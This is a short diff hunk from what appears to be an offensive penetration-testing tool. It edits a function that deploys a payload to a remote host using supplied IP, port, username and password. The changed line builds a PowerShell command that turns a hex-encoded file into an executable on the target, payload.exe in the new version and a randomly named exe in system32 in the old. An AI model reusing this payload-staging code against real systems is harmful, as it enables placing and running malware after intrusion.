@@ -121,7 +121,7 @@ def deploy_hex2binary(ipaddr,port,username,password,option):
 
         if option == "1":
                 # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
-                powershell_command = unicode("$s=gc \"C:\\Windows\\system32\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"C:\\Windows\\system32\\%s.exe\",$b)" % (random_exe,random_exe))
+                powershell_command = unicode("""$s=gc "payload.hex";$s=[string]::Join('',$s);$s=$s.Replace('`r','');$s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)| % {$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes("payload.exe",$b);""")
         
                 ########################################################################################################################################################################################################
                 #
